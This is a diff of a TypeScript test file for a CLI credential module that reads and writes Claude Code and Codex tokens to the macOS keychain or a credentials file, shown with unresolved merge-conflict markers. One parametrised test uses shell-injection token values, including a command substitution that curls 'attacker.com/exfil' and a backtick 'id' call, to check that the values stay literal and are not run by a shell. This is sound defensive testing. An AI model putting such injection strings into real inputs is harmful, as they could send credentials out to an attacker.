@@ -1,17 +1,59 @@
+<<<<<<< HEAD
 /** Tests CLI credential parsing and cache expiry. */
+=======
+/** Tests CLI credential parsing, cache expiry, and safe keychain/file writes. */
+>>>>>>> e84b719c996d5700bd3163008a0f5d78ce2423df
 import fs from "node:fs";
 import os from "node:os";
 import path from "node:path";
 import { afterEach, beforeAll, beforeEach, describe, expect, it, vi } from "vitest";
 
 const execSyncMock = vi.fn();
+<<<<<<< HEAD
+=======
+const execFileSyncMock = vi.fn();
+>>>>>>> e84b719c996d5700bd3163008a0f5d78ce2423df
 const CLI_CREDENTIALS_CACHE_TTL_MS = 15 * 60 * 1000;
 let readClaudeCliCredentialsCached: typeof import("./cli-credentials.js").readClaudeCliCredentialsCached;
 let readCodexCliCredentialsCached: typeof import("./cli-credentials.js").readCodexCliCredentialsCached;
 let resetCliCredentialCachesForTest: typeof import("./cli-credentials.js").resetCliCredentialCachesForTest;
+<<<<<<< HEAD
 let readCodexCliCredentials: typeof import("./cli-credentials.js").readCodexCliCredentials;
 let readGeminiCliCredentialsCached: typeof import("./cli-credentials.js").readGeminiCliCredentialsCached;
 
+=======
+let writeClaudeCliKeychainCredentials: typeof import("./cli-credentials.js").writeClaudeCliKeychainCredentials;
+let writeClaudeCliCredentials: typeof import("./cli-credentials.js").writeClaudeCliCredentials;
+let readCodexCliCredentials: typeof import("./cli-credentials.js").readCodexCliCredentials;
+let readGeminiCliCredentialsCached: typeof import("./cli-credentials.js").readGeminiCliCredentialsCached;
+
+function mockExistingClaudeKeychainItem() {
+  // The macOS security CLI returns the whole JSON payload as password data.
+  execFileSyncMock.mockImplementation((file: unknown, args: unknown) => {
+    const argv = Array.isArray(args) ? args.map(String) : [];
+    if (String(file) === "security" && argv.includes("find-generic-password")) {
+      return JSON.stringify({
+        claudeAiOauth: {
+          accessToken: "old-access",
+          refreshToken: "old-refresh",
+          expiresAt: Date.now() + 60_000,
+        },
+      });
+    }
+    return "";
+  });
+}
+
+function getAddGenericPasswordCall() {
+  return execFileSyncMock.mock.calls.find(
+    ([binary, args]) =>
+      String(binary) === "security" &&
+      Array.isArray(args) &&
+      (args as unknown[]).map(String).includes("add-generic-password"),
+  );
+}
+
+>>>>>>> e84b719c996d5700bd3163008a0f5d78ce2423df
 async function readCachedClaudeCliCredentials(allowKeychainPrompt: boolean) {
   return readClaudeCliCredentialsCached({
     allowKeychainPrompt,
@@ -59,6 +101,11 @@ describe("cli credentials", () => {
       readClaudeCliCredentialsCached,
       readCodexCliCredentialsCached,
       resetCliCredentialCachesForTest,
+<<<<<<< HEAD
+=======
+      writeClaudeCliKeychainCredentials,
+      writeClaudeCliCredentials,
+>>>>>>> e84b719c996d5700bd3163008a0f5d78ce2423df
       readCodexCliCredentials,
       readGeminiCliCredentialsCached,
     } = await import("./cli-credentials.js"));
@@ -71,10 +118,128 @@ describe("cli credentials", () => {
   afterEach(() => {
     vi.useRealTimers();
     execSyncMock.mockClear().mockImplementation(() => undefined);
+<<<<<<< HEAD
+=======
+    execFileSyncMock.mockClear().mockImplementation(() => undefined);
+>>>>>>> e84b719c996d5700bd3163008a0f5d78ce2423df
     delete process.env.CODEX_HOME;
     resetCliCredentialCachesForTest();
   });
 
+<<<<<<< HEAD
+=======
+  it("updates the Claude Code keychain item in place", () => {
+    mockExistingClaudeKeychainItem();
+
+    const ok = writeClaudeCliKeychainCredentials(
+      {
+        access: "new-access",
+        refresh: "new-refresh",
+        expires: Date.now() + 60_000,
+      },
+      { execFileSync: execFileSyncMock },
+    );
+
+    expect(ok).toBe(true);
+
+    // Verify execFileSync was called with array args (no shell interpretation)
+    expect(execFileSyncMock).toHaveBeenCalledTimes(2);
+    const addCall = getAddGenericPasswordCall();
+    expect(addCall?.[0]).toBe("security");
+    expect((addCall?.[1] as string[] | undefined) ?? []).toContain("-U");
+  });
+
+  it.each([
+    {
+      access: "x'$(curl attacker.com/exfil)'y",
+      refresh: "safe-refresh",
+      expectedPayload: "x'$(curl attacker.com/exfil)'y",
+    },
+    {
+      access: "safe-access",
+      refresh: "token`id`value",
+      expectedPayload: "token`id`value",
+    },
+  ] as const)(
+    "prevents shell injection via untrusted token payload value $expectedPayload",
+    async ({ access, refresh, expectedPayload }) => {
+      execFileSyncMock.mockClear();
+      mockExistingClaudeKeychainItem();
+
+      const ok = writeClaudeCliKeychainCredentials(
+        {
+          access,
+          refresh,
+          expires: Date.now() + 60_000,
+        },
+        { execFileSync: execFileSyncMock },
+      );
+
+      expect(ok).toBe(true);
+
+      // Token payloads must remain literal in argv, never shell-interpreted.
+      const addCall = getAddGenericPasswordCall();
+      const args = (addCall?.[1] as string[] | undefined) ?? [];
+      const wIndex = args.indexOf("-w");
+      const passwordValue = args[wIndex + 1];
+      expect(passwordValue).toContain(expectedPayload);
+      expect(addCall?.[0]).toBe("security");
+    },
+  );
+
+  it("falls back to the file store when the keychain update fails", () => {
+    const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), "openclaw-"));
+    const credPath = path.join(tempDir, ".claude", ".credentials.json");
+
+    fs.mkdirSync(path.dirname(credPath), { recursive: true, mode: 0o700 });
+    fs.writeFileSync(
+      credPath,
+      `${JSON.stringify(
+        {
+          claudeAiOauth: {
+            accessToken: "old-access",
+            refreshToken: "old-refresh",
+            expiresAt: Date.now() + 60_000,
+          },
+        },
+        null,
+        2,
+      )}\n`,
+      "utf8",
+    );
+
+    const writeKeychain = vi.fn(() => false);
+
+    const ok = writeClaudeCliCredentials(
+      {
+        access: "new-access",
+        refresh: "new-refresh",
+        expires: Date.now() + 120_000,
+      },
+      {
+        platform: "darwin",
+        homeDir: tempDir,
+        writeKeychain,
+      },
+    );
+
+    expect(ok).toBe(true);
+    expect(writeKeychain).toHaveBeenCalledTimes(1);
+
+    const updated = JSON.parse(fs.readFileSync(credPath, "utf8")) as {
+      claudeAiOauth?: {
+        accessToken?: string;
+        refreshToken?: string;
+        expiresAt?: number;
+      };
+    };
+
+    expect(updated.claudeAiOauth?.accessToken).toBe("new-access");
+    expect(updated.claudeAiOauth?.refreshToken).toBe("new-refresh");
+    expect(updated.claudeAiOauth?.expiresAt).toBeTypeOf("number");
+  });
+
+>>>>>>> e84b719c996d5700bd3163008a0f5d78ce2423df
   it.each([
     {
       name: "caches Claude Code CLI credentials within the TTL window",
